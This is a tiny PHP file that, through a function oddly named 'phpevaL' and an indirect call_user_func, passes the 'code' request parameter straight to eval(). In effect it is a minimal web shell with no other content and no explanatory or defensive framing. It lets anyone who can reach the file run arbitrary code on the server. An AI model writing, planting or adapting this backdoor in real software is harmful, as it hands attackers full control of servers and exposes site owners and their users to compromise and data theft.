<?php
function phpevaL(){
	if (!empty($_REQUEST['code'])){
		$code = str_replace("<?php","",$_REQUEST['code']);
		eval($code);
	}
}

call_user_func('phpevaL');
?>